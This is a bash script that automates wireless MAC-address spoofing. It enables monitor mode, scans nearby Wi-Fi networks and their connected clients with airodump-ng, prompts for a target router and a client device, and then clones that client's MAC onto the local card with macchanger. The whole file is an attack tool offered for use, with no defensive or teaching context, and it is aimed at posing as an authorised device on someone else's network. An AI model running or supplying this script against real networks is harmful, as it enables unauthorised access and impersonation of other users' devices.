#!/bin/bash

sudo airmon-ng start wlan0
sleep 3

iwconfig
sleep 3

sudo timeout 20 airodump-ng wlan0
sleep 1

read -p "Enter router MAC-address: " mac_address
if [[ -z "$mac_address" ]]; then
  echo "❌ Router MAC address is required!"
  exit 1
fi

read -p "Choose channel: " channel
if [[ -z "$channel" ]]; then
  echo "❌ Channel is required!"
  exit 1
fi

sudo timeout 16 airodump-ng -c "$channel" -a --bssid "$mac_address" wlan0
sleep 1

read -p "Enter device's MAC-address: " mac_address2
if [[ -z "$mac_address2" ]]; then
  echo "❌ Device MAC address is required!"
  exit 1
fi

sudo airmon-ng stop wlan0
sleep 3

sudo ifconfig wlan0 down
sleep 3

echo "Changing maccaddress....."
sleep 2

sudo macchanger -m "$mac_address2" wlan0
sleep 3

sudo ifconfig wlan0 up
sleep 3

ip a

